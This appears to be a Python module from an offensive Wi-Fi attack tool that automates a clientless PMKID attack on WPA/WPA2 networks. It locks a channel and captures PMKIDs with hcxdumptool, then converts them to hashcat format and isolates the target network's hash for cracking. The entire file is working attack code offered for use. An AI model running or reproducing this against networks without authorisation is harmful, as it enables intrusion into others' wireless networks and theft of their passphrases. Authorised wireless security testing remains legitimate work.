"""PMKID attack (clientless): capture with hcxdumptool, convert with hcxpcapngtool."""

from __future__ import annotations

import os
import re

from anywifi.attacks.base import Attack
from anywifi.config import PMKID_CAPTURE_TIME
from anywifi.model import AttackContext, AttackResult, Network

_WPA_ENC = {"WPA", "WPA2", "WPA2/WPA3"}


def _hcx_version(runner) -> tuple:
    """Return hcxdumptool version as (major, minor); (0, 0) if undetectable."""
    res = runner.run(["hcxdumptool", "--version"], timeout=10)
    m = re.search(r"(\d+)\.(\d+)", (res.stdout or "") + (res.stderr or ""))
    return (int(m.group(1)), int(m.group(2))) if m else (0, 0)


def _build_capture_cmd(runner, iface: str, pcapng: str, channel: int, dry_run: bool) -> list:
    """Build the hcxdumptool command (6.3+ syntax differs from older releases)."""
    ver = (0, 0) if dry_run else _hcx_version(runner)
    # Unknown version (0,0) → assume modern syntax (current Kali).
    use_new = ver == (0, 0) or ver >= (6, 3)
    if use_new:
        # New syntax (6.3+): -w output, -c channel
        return ["hcxdumptool", "-i", iface, "-w", pcapng, "-c", str(channel)]
    # Old syntax (<6.3): -o output, --enable_status
    return ["hcxdumptool", "-i", iface, "-o", pcapng, "-c", str(channel), "--enable_status=1"]


class PmkidAttack(Attack):
    vector = "pmkid"
    label = "WPA/WPA2 PMKID (clientless)"

    def applicable(self, net: Network) -> bool:
        # PMKID needs no client; on transition (WPA2/WPA3) it targets the WPA2 side.
        return net.encryption in _WPA_ENC

    def run(self, net: Network, ctx: AttackContext) -> AttackResult:
        runner = ctx.runner
        iface = ctx.interface
        base = os.path.join(str(ctx.output_dir), f"pmkid_{_safe(net.bssid)}")
        pcapng = base + ".pcapng"
        hashfile = base + ".22000"

        # Lock the channel; the hcxdumptool command is built per version.
        runner.run(["iw", "dev", iface, "set", "channel", str(net.channel)])
        cmd = _build_capture_cmd(runner, iface, pcapng, net.channel, ctx.dry_run)
        ctx.status("listening for a PMKID (no clients needed)…")
        runner.run_timed(cmd, duration=PMKID_CAPTURE_TIME, capture=True)

        if not os.path.exists(pcapng) and not ctx.dry_run:
            return self._result(net, success=False, message="AP did not offer a PMKID")

        # Convert to hashcat 22000 format
        ctx.status("checking the capture for a PMKID…")
        runner.run(["hcxpcapngtool", "-o", hashfile, pcapng], timeout=60)

        target_hash = _filter_for_bssid(hashfile, net.bssid, pmkid_only=True)
        if target_hash:
            return self._result(
                net, success=True, hash_file=target_hash, capture_file=pcapng,
                message="PMKID captured — will try to crack",
            )
        if ctx.dry_run:
            return self._result(net, success=True, hash_file=hashfile,
                                message="(dry-run) PMKID flow")
        return self._result(net, success=False, capture_file=pcapng,
                            message="No PMKID obtained")


def _safe(bssid: str) -> str:
    return bssid.replace(":", "")


def _filter_for_bssid(hashfile: str, bssid: str, pmkid_only: bool = False):
    """Write only the target-BSSID lines from a 22000 file into a separate file."""
    if not os.path.exists(hashfile):
        return None
    mac = bssid.replace(":", "").lower()
    kept = []
    try:
        with open(hashfile, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                low = line.lower()
                if mac not in low:
                    continue
                if pmkid_only and not low.startswith("wpa*01*"):
                    continue
                kept.append(line.rstrip("\n"))
    except OSError:
        return None
    if not kept:
        return None
    out = hashfile + ".target"
    with open(out, "w", encoding="utf-8") as fh:
        fh.write("\n".join(kept) + "\n")
    return out
